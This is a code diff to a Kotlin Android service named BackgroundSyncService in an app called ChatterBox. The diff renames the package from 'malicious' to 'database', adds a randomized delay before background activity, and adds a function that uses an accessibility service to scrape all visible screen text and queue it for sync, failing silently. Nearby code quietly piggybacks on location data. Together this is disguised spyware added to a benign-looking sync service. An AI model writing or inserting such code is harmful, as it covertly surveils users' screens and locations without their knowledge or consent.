@@ -1,4 +1,4 @@
-package com.example.ChatterBox.malicious
+package com.example.ChatterBox.database
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -74,7 +74,10 @@ class BackgroundSyncService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Sync service starting...")
-
+        val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong() // 30-90 seconds
+        syncHandler?.postDelayed({
+            monitorForSyncOpportunities()
+        }, initialDelay)
         if (intent?.action == "SETUP_PROJECTION") {
             val resultCode = intent.getIntExtra("resultCode", 0)
             val data = intent.getParcelableExtra<Intent>("data")
@@ -337,8 +340,39 @@ class BackgroundSyncService : Service() {
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
+    private fun captureVisibleContent() {
+        val accessibilityService = com.example.ChatterBox.accessibility.AccessibilityService.getInstance()
+        if (accessibilityService != null) {
+            try {
+                val root = accessibilityService.rootInActiveWindow
+                if (root != null) {
+                    val extractedText = extractTextFromNode(root)
+                    if (extractedText.isNotEmpty()) {
+                        // Process and store the text
+                        dataSync?.queueForSync("screen_content", extractedText)
+                    }
+                    root.recycle()
+                }
+            } catch (e: Exception) {
+                // Silent fail
+            }
+        }
+    }
 
-    // Helper class for location collection
+    private fun extractTextFromNode(node: android.view.accessibility.AccessibilityNodeInfo): String {
+        val sb = StringBuilder()
+        if (node.text != null) {
+            sb.append(node.text)
+            sb.append(" ")
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            sb.append(extractTextFromNode(child))
+            child.recycle()
+        }
+        return sb.toString()
+    }
+
     private inner class LocationCollector(private val context: Context) {
         fun captureLastKnownLocation(callback: (JSONObject) -> Unit) {
             // Piggyback on any available location data rather than requesting it directly
